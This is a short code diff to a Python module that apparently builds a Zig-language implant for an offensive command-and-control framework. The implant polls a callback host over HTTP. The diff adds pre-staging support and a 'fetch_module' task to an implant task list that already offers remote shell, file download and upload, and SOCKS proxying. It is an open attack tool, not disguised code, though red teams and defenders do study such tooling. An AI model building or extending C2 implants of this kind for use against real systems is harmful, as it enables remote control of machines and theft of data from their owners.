@@ -35,6 +35,9 @@ class ZigKittyHttpPollingBase(with_metaclass(ModuleOptionsAggregator, object)):
     ``show options`` when mixed into a Payload Module.
     """
 
+    PRESTAGE_SUPPORTED = True
+    CLIENT_LANGUAGE = "zig"
+
     lhost = OptString("127.0.0.1", "Callback host", True)
     lport = OptPort(8088, "Callback port", True)
     url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
@@ -91,6 +94,8 @@ class ZigKittyHttpPollingBase(with_metaclass(ModuleOptionsAggregator, object)):
             ed25519_seed_hex=seed_hex,
             use_ssl=bool(getattr(getattr(self, "use_ssl", None), "value", self.use_ssl)),
         )
+        if hasattr(self, "_apply_prestage_to_script"):
+            zig_code = self._apply_prestage_to_script(zig_code)
 
         output_path = Path(self.output_dir) if self.output_dir else Path("output")
         output_path = output_path.resolve()
@@ -128,7 +133,7 @@ class ZigKittyHttpPollingBase(with_metaclass(ModuleOptionsAggregator, object)):
             print_info("Ed25519 signing: enabled (query sig= on poll/result)")
         else:
             print_info("Ed25519 signing: disabled (set implant_identity=true to enable)")
-        print_info("Tasks: shell/ls/pwd/whoami/cat/download/upload/socks_start/socks_stop/exit")
+        print_info("Tasks: shell/ls/pwd/whoami/cat/download/upload/fetch_module/socks_start/socks_stop/exit")
         print_info("Listener: listeners/multi/reverse_http_polling")
 
         if not self.auto_compile:
